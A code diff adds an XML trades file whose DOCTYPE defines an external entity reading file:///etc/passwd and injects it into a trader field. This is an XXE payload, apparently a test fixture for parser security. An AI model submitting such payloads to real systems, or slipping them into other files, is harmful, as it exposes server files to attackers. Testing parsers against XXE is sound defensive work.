@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<trades>
+    <metadata>
+        <name>Apple Pomace</name>
+        <trader>
+            <foo>&xxe;</foo>
+            <name>Peter Guo</name>
+        </trader>
+        <units>2000</units>
+        <price>146</price>
+    </metadata>
+</trades>
